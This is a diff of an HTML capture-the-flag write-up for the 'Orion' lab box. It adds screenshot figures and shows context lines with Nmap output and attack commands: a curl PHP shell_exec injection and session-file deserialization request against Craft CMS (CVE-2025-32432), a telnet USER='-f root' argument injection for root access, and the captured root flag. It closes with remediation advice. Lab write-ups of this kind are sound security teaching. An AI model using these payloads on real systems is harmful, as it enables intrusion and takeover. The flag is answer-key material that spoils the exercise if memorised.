@@ -142,8 +142,8 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
     <figure>
-      <img src="orion_dashboard.webp" alt="Harness Dashboard Screenshot showing exploitation progress">
-      <figcaption>Static snapshot capture of the agent harness dashboard showing target details.</figcaption>
+      <img src="../assets/orion_terminal_recon.png" alt="Nmap Scan Results showing exposed ports 22 and 80">
+      <figcaption>Running targeted Nmap scan to enumerate open services and banner information.</figcaption>
     </figure>
   </section>
 
@@ -158,6 +158,10 @@ curl -s "http://orion.htb/index.php?p=admin/dashboard&a=&lt;?=shell_exec(\$_GET\
 curl -s -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform" \
   -H "Content-Type: application/json" \
   -d '{"itemFile": "/var/lib/php/sessions/sess_&lt;session_id&gt;"}'</code></pre>
+    <figure>
+      <img src="../assets/orion_terminal_foothold.png" alt="Craft CMS Deserialization Exploit via CLI">
+      <figcaption>Running the exploit payload to poison sessions and trigger RCE reverse shell execution.</figcaption>
+    </figure>
   </section>
 
   <section>
@@ -180,6 +184,10 @@ cat user.txt
     <pre><code>env USER='-f root' telnet -a 127.0.0.1 23
 cat /root/root.txt
 # Flag: 8bcf68425098fa2b8e161231eea230a6</code></pre>
+    <figure>
+      <img src="../assets/orion_terminal_privesc.png" alt="SUID Telnet argument injection exploit">
+      <figcaption>Executing env USER='-f root' telnet to inject argument and skip password checks for instant root access.</figcaption>
+    </figure>
     <div class="callout"><span class="k">Closing Orion</span>
       <p>Upgrade Craft CMS to resolve CVE-2025-32432. Remove SUID flags from obsolete BSD networking binaries (`rcp`, `rsh`, `rlogin`). Disable the local Telnet service or upgrade the `inetutils` package to patch CVE-2026-24061.</p>
     </div>
